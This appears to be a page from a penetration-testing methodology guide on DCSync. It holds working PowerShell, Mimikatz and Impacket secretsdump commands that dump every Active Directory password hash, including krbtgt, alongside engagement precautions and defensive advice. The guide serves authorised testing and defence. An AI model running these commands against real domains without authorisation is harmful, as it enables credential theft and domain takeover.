---
layout: page
title: "DCSync"
subtitle: "Ask a domain controller to replicate password data, using replication rights"
permalink: /methodology/active-directory/dcsync/
---

DCSync uses the Directory Replication Service Remote Protocol (MS-DRSR), which domain controllers use to replicate directory data between themselves. An account with the replication rights can ask a DC to send password data for any account, including the built-in administrator and the krbtgt account. The required rights are DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object. Accounts that hold them are usually either DCs or accounts that have been granted replication rights by mistake. Rights of this kind are close to full domain compromise.

## Primer

- The replication rights are extended rights on the domain object. Domain controllers hold them, and they can be granted to other accounts by mistake.
- An account given only `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` can perform DCSync without being a DA.
- Reversible encryption is a separate case. Accounts with it enabled have their passwords stored with RC4 encryption, and the key is kept in the registry. Tools decrypt these values during the dump. The stored value is encrypted, not plaintext.

## Workflow

1. Confirm that the account you hold has both replication rights on the domain object.
2. Check the account's group memberships and the ACL on the domain object.
3. Run the dump with a tool that you have approved, limited to the accounts you need.
4. Record the dump, store it securely, and report it as a finding with the account that held the rights.

## Step 1: Verify the rights

```powershell
Get-DomainUser -Identity TARGET_USER | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

Check the ACL on the domain object, filtering for replication rights and for the account's SID:

```powershell
$sid = "S-1-5-21-DOMAIN_ID-RID"
Get-ObjectAcl "BASE_DN" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

If you hold WriteDACL over the domain object, you can grant yourself these rights first. That is a change to the domain, so record it and remove it during cleanup.

## Step 2: Dump the hashes

Run the dump as an account that has the rights. With Mimikatz, the process context matters, so start a process with `runas /netonly`:

```cmd
runas /netonly /user:DOMAIN\TARGET_USER powershell
```

```text
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:DOMAIN /user:DOMAIN\administrator
```

From Linux, Impacket's `secretsdump.py` runs the same protocol over the network:

```bash
secretsdump.py -outputfile DOMAIN_hashes -just-dc DOMAIN/TARGET_USER@DC_IP
```

Useful options:

- `-just-dc-ntlm` returns NT hashes only.
- `-just-dc-user USERNAME` limits the dump to one account.
- `-user-status` adds account status, so you can drop disabled accounts from the cracking statistics.

## Reversible encryption

Accounts with `ENCRYPTED_TEXT_PWD_ALLOWED` set in `userAccountControl` store passwords with reversible encryption. Find them with:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

`secretsdump.py` decrypts these values automatically during the dump. Treat the result as cleartext.

## What to look for

- Non-DC accounts that hold either replication right
- Service or sync accounts with replication rights, which are often forgotten
- Accounts with reversible encryption enabled
- Whether the krbtgt hash is in scope for the engagement

## Pitfalls

- DCSync generates replication traffic from a non-DC host. Confirm that it is expected in the rules of engagement.
- The dump contains every password hash in the domain. Store it encrypted, limit access, and destroy it at the end of the engagement.
- Do not use the krbtgt hash to forge tickets (for persistence) unless the client has approved it in writing.

## Defense

The notes do not list a DCSync-specific control. The practical steps are:

- Review who holds DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object, and remove them from accounts that do not need them.
- Treat accounts with replication rights as Tier 0 and protect them as you would Domain Admins.
- Audit changes to the domain object, since Event ID `5136` records modifications to it (see [ACL Abuse](/methodology/active-directory/acl-abuse/)).
- Turn off reversible encryption for accounts that do not need it.
